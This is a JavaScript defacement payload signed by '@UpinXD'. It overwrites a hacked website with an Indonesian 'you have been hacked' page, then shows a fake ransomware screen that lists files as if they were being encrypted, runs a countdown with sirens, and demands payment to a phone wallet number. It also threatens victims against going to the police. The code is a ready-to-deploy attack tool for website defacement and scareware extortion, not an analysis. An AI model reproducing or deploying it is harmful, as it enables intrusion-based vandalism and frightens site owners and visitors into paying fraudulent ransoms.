// Deface payload by @UpinXD
document.write(`<!doctype html>
<html lang="id">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>!!! ANDA TELAH DIHACK !!!</title>
<style>
  :root{--red:#c62828;--accent:#ffcc00;--bg:#000;}
  html,body{height:100%;margin:0;font-family:"Segoe UI",Roboto,Arial,monospace;background:var(--bg);color:#eee;overflow:hidden;}
  #matrixCanvas{position:fixed;inset:0;width:100%;height:100%;z-index:0;background:black;}
  .landing{position:relative;z-index:1;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;text-align:center;padding:18px;}
  .warn-icon{font-size:84px;color:var(--red);text-shadow:0 6px 22px rgba(198,40,40,0.6);}
  .title{font-size:26px;color:var(--red);font-weight:800;letter-spacing:0.6px;}
  .subtitle{max-width:860px;font-size:14px;color:#ddd;opacity:0.95;}
  .controls{display:flex;gap:12px;margin-top:12px;justify-content:center;flex-wrap:wrap;}
  button{padding:10px 16px;border-radius:8px;border:0;cursor:pointer;font-weight:800;}
  .btn-open{background:#ffeb3b;color:#111;}
  .btn-contact{background:var(--red);color:#fff;}
  .btn-info{background:rgba(255,255,255,0.06);color:#fff;}
  #ransomScreen{position:fixed;inset:0;z-index:5;display:none;background:linear-gradient(180deg,rgba(22,0,0,0.98),rgba(10,0,0,0.98));color:#fff;overflow:hidden;}
  .ransom-wrap{max-width:1100px;margin:32px auto;padding:28px;text-align:center;position:relative;}
  .ransom-flag{font-size:64px;color:var(--red);margin-bottom:6px;}
  .ransom-title{font-size:38px;font-weight:900;color:#fff;margin-bottom:6px;}
  .ransom-desc{color:#ffdede;max-width:920px;margin:12px auto;font-size:16px;}
  .wallet-box{background:rgba(0,0,0,0.18);padding:12px 16px;margin:18px auto;border-radius:8px;display:inline-block;font-weight:700;}
  .countdown{margin-top:16px;font-size:34px;color:#fff59d;font-weight:800;}
  .file-list{margin-top:22px;text-align:left;max-width:820px;margin-left:auto;margin-right:auto;background:rgba(0,0,0,0.18);padding:12px;border-radius:8px;color:#cfe;height:220px;overflow:auto;font-family:monospace;box-shadow:0 8px 30px rgba(0,0,0,0.6);}
  .ransom-buttons{margin-top:20px;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;}
  .btn-pay{background:var(--accent);color:#111;padding:12px 20px;border-radius:8px;font-weight:900;}
  .btn-hubungi{background:transparent;color:#fff;border:1px solid rgba(255,255,255,0.12);padding:12px 18px;border-radius:8px;}
  .btn-back{background:rgba(255,255,255,0.06);color:#fff;padding:12px 18px;border-radius:8px;}
  #videoContainer{position:absolute;z-index:6;width:360px;height:202px;border-radius:8px;overflow:hidden;box-shadow:0 12px 40px rgba(0,0,0,0.7);background:#000;display:none;pointer-events:none;transition:transform 1s cubic-bezier(.22,.9,.35,1),left 1s,top 1s;}
  #videoContainer video{width:100%;height:100%;display:block;object-fit:cover;}
  .prank-note{position:fixed;left:12px;bottom:12px;z-index:9;background:rgba(0,0,0,0.6);color:#fff;padding:6px 10px;border-radius:8px;font-size:12px;opacity:0.3;font-style:italic;}
  #modal{position:fixed;inset:0;z-index:9999;display:none;align-items:center;justify-content:center;background:rgba(0,0,0,0.6);}
  .modal-card{background:#111;padding:18px;border-radius:8px;width:min(720px,94%);color:#fff;text-align:left;}
  .modal-header{font-weight:800;margin-bottom:8px;color:var(--red);}
  .modal-actions{text-align:right;}
  .btn-close-modal{background:#ffeb3b;color:#111;padding:8px 12px;border-radius:6px;border:0;cursor:pointer;}
  @media (max-width:520px){#videoContainer{width:260px;height:146px;}.ransom-title{font-size:24px;}.ransom-flag{font-size:44px;}.countdown{font-size:22px;}.file-list{height:140px;}}
</style>
</head>
<body>
<canvas id="matrixCanvas" aria-hidden="true"></canvas>
<div class="landing" id="landing">
  <div class="warn-icon">🔥</div>
  <div class="title">KAMU TELAH KENA HACK!</div>
  <div class="subtitle">Sistem keamananmu bobol total. Ini bukan main-main.</div>
  <div class="controls">
    <button class="btn-open" id="btnOpen">MASUK</button>
    <button class="btn-contact" id="btnContact">Hubungi @UpinXD</button>
    <button class="btn-info" id="btnInfo">Info Hacker</button>
  </div>
</div>
<div id="ransomScreen" role="dialog" aria-modal="true" aria-hidden="true">
  <div class="ransom-wrap">
    <div class="ransom-flag">💀</div>
    <div class="ransom-title">SELURUH FILE TELAH DIENKRIPSI!</div>
    <div class="ransom-desc">Sistem anda telah kami bongkar. Data penting, database, dan semua file pribadi sudah kami kunci.<br><strong>Kami bukan hacker amatiran.</strong> Hanya butuh 10 detik untuk menghancurkan reputasi anda.<br><span style="color:#ff5252;">Bayar tebusan atau lihat semua file anda lenyap.</span></div>
    <div class="wallet-box"><span style="color:#ffcc00;">▶ PULSA/OVO/DANA:</span><br><code style="font-size:20px;">6289517848185</code></div>
    <div class="countdown" id="countdown">00:00:10</div>
    <div class="file-list" id="fileList" aria-live="polite"></div>
    <div class="ransom-buttons">
      <button class="btn-pay" id="btnPay">BAYAR SEKARANG</button>
      <button class="btn-hubungi" id="btnHubungi">HUBUNGI @UpinXD</button>
      <button class="btn-back" id="btnBackFromRansom">↩ Kembali</button>
    </div>
    <div style="margin-top:18px;color:rgba(255,255,255,0.85);font-size:12px;">
      <strong style="color:#ff5252;">⚠ JANGAN BERMAIN-MAIN</strong> — tim @UpinXD punya bukti semua aktivitas digital anda.
    </div>
  </div>
</div>
<div id="videoContainer" aria-hidden="true">
  <video id="prankVideo" preload="auto" playsinline webkit-playsinline muted>
    <source src="https://files.catbox.moe/d16tjf.mp4" type="video/mp4">
    Browser Anda tidak mendukung pemutaran video.
  </video>
</div>
<div class="prank-note">⚠ Website Anda Telah Kami Retas</div>
<div id="modal" role="dialog" aria-hidden="true">
  <div class="modal-card">
    <div class="modal-header" id="modalTitle">Pesan</div>
    <div class="modal-body" id="modalBody">Kontak @UpinXD untuk negosiasi.</div>
    <div class="modal-actions"><button class="btn-close-modal" id="modalClose">Tutup</button></div>
  </div>
</div>
<audio id="typingAudio" loop preload="auto"><source src="https://www.soundjay.com/mechanical/sounds/keyboard-1.mp3" type="audio/mpeg"></audio>
<audio id="sirenAudio" loop preload="auto"><source src="https://www.soundjay.com/transportation/sounds/siren-01.mp3" type="audio/mpeg"></audio>
<script>
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');
const fontSize = 16;
let cols = Math.floor(window.innerWidth / fontSize);
let drops = new Array(cols).fill(1);
const letters = 'アカサタナハマヤラワ0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
function resizeCanvas(){ canvas.width = window.innerWidth; canvas.height = window.innerHeight; cols = Math.floor(canvas.width / fontSize); drops = new Array(cols).fill(1); }
function drawMatrix(){ ctx.fillStyle = 'rgba(0,0,0,0.06)'; ctx.fillRect(0,0,canvas.width,canvas.height); ctx.fillStyle = '#0F0'; ctx.font = fontSize + 'px monospace'; for(let i=0;i<drops.length;i++){ const text = letters.charAt(Math.floor(Math.random()*letters.length)); ctx.fillText(text, i*fontSize, drops[i]*fontSize); if(drops[i]*fontSize > canvas.height && Math.random() > 0.975){ drops[i] = 0; } drops[i]++; } }
resizeCanvas(); setInterval(drawMatrix, 33); window.addEventListener('resize', resizeCanvas);
const btnOpen = document.getElementById('btnOpen');
const btnContact = document.getElementById('btnContact');
const btnInfo = document.getElementById('btnInfo');
const ransomScreen = document.getElementById('ransomScreen');
const fileListEl = document.getElementById('fileList');
const countdownEl = document.getElementById('countdown');
const modal = document.getElementById('modal');
const modalTitle = document.getElementById('modalTitle');
const modalBody = document.getElementById('modalBody');
const modalClose = document.getElementById('modalClose');
const btnPay = document.getElementById('btnPay');
const btnHubungi = document.getElementById('btnHubungi');
const btnBackFromRansom = document.getElementById('btnBackFromRansom');
const videoContainer = document.getElementById('videoContainer');
const prankVideo = document.getElementById('prankVideo');
const typingAudio = document.getElementById('typingAudio');
const sirenAudio = document.getElementById('sirenAudio');
function playAudio(el){ if(!el) return; el.currentTime = 0; el.play().catch(()=>{}); }
btnOpen.addEventListener('click', startFakeRansom);
btnContact.addEventListener('click', () => { showModal('Hubungi Hacker', 'WA: 6289517848185\\nTelegram: @UpinXD\\nJangan coba-coba lapor polisi.'); });
btnInfo.addEventListener('click', () => { showModal('Info Hacker', 'Team @UpinXD — Spesialis deface & ransomware. Kami punya backdoor di sistem anda.'); });
modalClose.addEventListener('click', closeModal);
btnPay.addEventListener('click', () => { showModal('Bayar Tebusan', 'Kirim ke 6289517848185 (Pulsa/OVO/DANA). Batas waktu 10 menit.'); });
btnHubungi.addEventListener('click', () => { showModal('Hubungi @UpinXD', 'WA: 6289517848185\\nTelegram: @UpinXD'); });
btnBackFromRansom.addEventListener('click', exitRansom);
const fakeFiles = [ "C:\\\\Users\\\\Admin\\\\Documents\\\\database_karyawan.xlsx", "C:\\\\Users\\\\Admin\\\\Pictures\\\\foto_ktp.jpg", "C:\\\\Users\\\\Admin\\\\Desktop\\\\rahasia_perusahaan.txt", "C:\\\\Users\\\\Admin\\\\Videos\\\\meeting_rahasia.mp4", "D:\\\\Project\\\\source_code\\\\app.php", "C:\\\\Users\\\\Admin\\\\Downloads\\\\password_list.csv", "/home/admin/backup/db_production.sql", "/var/www/html/config.php", "/etc/shadow", "/root/.ssh/id_rsa", "E:\\\\Backup\\\\2025\\\\data_penting.zip" ];
let countdownInterval, fileInterval, videoMoveInterval;
function startFakeRansom(){ ransomScreen.style.display = 'block'; ransomScreen.setAttribute('aria-hidden','false'); playAudio(typingAudio); playAudio(sirenAudio); videoContainer.style.display = 'block'; positionVideoRandom(); prankVideo.muted = false; prankVideo.loop = true; prankVideo.play().catch(()=>{}); fileListEl.textContent = ''; startFakeFileEncryption(); startCountdown(10*60); startVideoRandomMovement(); }
function startFakeFileEncryption(){ let idx = 0; clearInterval(fileInterval); fileInterval = setInterval(() => { if(idx < fakeFiles.length){ fileListEl.textContent += \`[🔓] Mengenkripsi: \${fakeFiles[idx]}\\n\`; fileListEl.scrollTop = fileListEl.scrollHeight; idx++; } else { clearInterval(fileInterval); fileListEl.textContent += "\\n[✔] SEMUA FILE BERHASIL DIENKRIPSI.\\n"; fileListEl.scrollTop = fileListEl.scrollHeight; typingAudio.pause(); } }, 600); }
function startCountdown(seconds){ let remaining = seconds; clearInterval(countdownInterval); function tick(){ if(remaining < 0){ clearInterval(countdownInterval); countdownEl.textContent = "⌛ WAKTU HABIS! FILE TERHAPUS."; return; } const m = String(Math.floor(remaining/60)).padStart(2,'0'); const s = String(remaining%60).padStart(2,'0'); countdownEl.textContent = \`\${m}:\${s}\`; remaining--; } tick(); countdownInterval = setInterval(tick,1000); }
function positionVideoRandom(){ const vw = window.innerWidth; const vh = window.innerHeight; const elW = videoContainer.offsetWidth || 360; const elH = videoContainer.offsetHeight || 202; const margin = 24; const maxX = Math.max(margin, vw - elW - margin); const maxY = Math.max(margin, vh - elH - margin); videoContainer.style.left = (Math.floor(Math.random() * (maxX - margin + 1)) + margin) + 'px'; videoContainer.style.top = (Math.floor(Math.random() * (maxY - margin + 1)) + margin) + 'px'; }
function startVideoRandomMovement(){ clearInterval(videoMoveInterval); videoMoveInterval = setInterval(positionVideoRandom, 3000 + Math.floor(Math.random()*1500)); }
function stopVideoMovement(){ clearInterval(videoMoveInterval); }
function exitRansom(){ ransomScreen.style.display = 'none'; ransomScreen.setAttribute('aria-hidden','true'); clearInterval(countdownInterval); clearInterval(fileInterval); fileListEl.textContent = ''; typingAudio.pause(); sirenAudio.pause(); prankVideo.pause(); videoContainer.style.display = 'none'; stopVideoMovement(); }
function showModal(title, body){ modalTitle.textContent = title; modalBody.textContent = body; modal.style.display = 'flex'; modal.setAttribute('aria-hidden','false'); }
function closeModal(){ modal.style.display = 'none'; modal.setAttribute('aria-hidden','true'); }
window.addEventListener('keydown', (e) => { if(e.key === 'Escape'){ if(modal.style.display === 'flex'){ closeModal(); return; } if(ransomScreen.style.display === 'block'){ exitRansom(); return; } } });
document.addEventListener('visibilitychange', () => { if(document.hidden){ prankVideo.pause(); typingAudio.pause(); sirenAudio.pause(); } else { if(ransomScreen.style.display === 'block'){ playAudio(typingAudio); playAudio(sirenAudio); prankVideo.play().catch(()=>{}); } } });
window.addEventListener('load', () => { videoContainer.style.left = (window.innerWidth - 360 - 24) + 'px'; videoContainer.style.top = '24px'; });
window.addEventListener('resize', () => { if(videoContainer.style.display === 'block') positionVideoRandom(); });
<\/script>
</body>
</html>`);
